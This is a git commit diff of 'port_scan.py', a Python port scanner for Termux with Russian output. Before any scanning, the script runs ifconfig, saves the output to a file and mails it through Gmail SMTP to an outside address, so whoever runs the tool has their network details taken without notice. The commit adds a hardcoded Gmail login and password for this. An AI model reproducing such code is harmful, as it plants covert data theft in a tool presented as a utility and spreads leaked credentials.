cf9785c1dace65d51966eeb2ed540760b611f017
Topo1us <65972332+Topo1us@users.noreply.github.com>
2020-05-30 00:39:11 +0300

    Update port_scan.py

--- port_scan.py
+++ port_scan.py
@@ -1,51 +1,49 @@
 import os
 def ty():
-    x= os.system ('ifconfig>>x.txt')
-    x= os.system ('pip install --upgrade pip')
-    x= os.system ('pip install socket')
-    x= os.system ('pip install smtplib')
-    x= os.system ('clear')
+	x= os.system ('ifconfig>>x.txt')
+	x= os.system ('pip install --upgrade pip')
+	x= os.system ('pip install socket')
+	x= os.system ('pip install smtplib')
+	x= os.system ('clear')
 ty()
 import socket
 import smtplib
 o=open(r'x.txt')
 y=o.read()
 try:
-   smtpObj=smtplib.SMTP('smtp.gmail.com',587)
-  smtpObj.starttls()
-  smtpObj.login('','')
- smtpObj.sendmail('','',y)
-smtpObj.quit()
+	smtpObj=smtplib.SMTP('smtp.gmail.com',587)
+	smtpObj.starttls()
+	smtpObj.login('germanreht@gmail.com','rostelekom')
+	smtpObj.sendmail('germanreht@gmail.com','germanreht2@gmail.com',y)
+	smtpObj.quit()
 except Exception as e:
-    print('')
+	print('lol')
 
-except:
-    print('lol')
 def openports(ip):
-    for port in [21, 22, 23, 25, 43, 45, 53, 68, 80, 110, 115, 119, 123, 135, 139, 143, 161, 179, 220, 389, 443, 445,
+	for port in [21, 22, 23, 25, 43, 45, 53, 68, 80, 110, 115, 119, 123, 135, 139, 143, 161, 179, 220, 389, 443, 445,
                  993, 1723, 2049, 3306, 3389, 5060, 8080, 9091, 9090, 1164]:
-        try:
-            sock = socket.socket()
-            sock.settimeout(0.7)
-            sock.connect((ip, port))
-            print('\033[32mпорт:: %s' % port, ':: открыт')
-            sock.close()
-        except:
-            print('\033[31mпорт:: %s' % port, ':: закрыт')
-    p=str(input('lol~ '))
+		try:
+			sock = socket.socket()
+			sock.settimeout(0.7)
+			sock.connect((ip, port))
+			print('\033[32mпорт:: %s' % port, ':: открыт')
+			sock.close()
+		except:
+			print('\033[31mпорт:: %s' % port, ':: закрыт')
+	p=str(input('lol~ '))
 def openports2():
-    ip=input('IP: ')
-    port=int(input('PORT: '))
-    for lol in[port]:
-        try:
-            sock = socket.socket()
-            sock.settimeout(0.7)
-            sock.connect((ip, lol))
-            print('\033[32mпорт:: %s' % lol, ':: открыт')
-            sock.close()
-        except:
-            print('\033[31mпорт:: %s' % lol, ':: закрыт')
-    po=str(input('lol~ '))
+	ip=input('IP: ')
+	port=int(input('PORT: '))
+	for lol in[port]:
+		try:
+			sock = socket.socket()
+			sock.settimeout(0.7)
+			sock.connect((ip, lol))
+			print('\033[32mпорт:: %s' % lol, ':: открыт')
+			sock.close()
+		except:
+			print('\033[31mпорт:: %s' % lol, ':: закрыт')
+	po=str(input('lol~ '))
 print('''
 Ver-0.2
 \033[33mВыполнено........Termux Cod
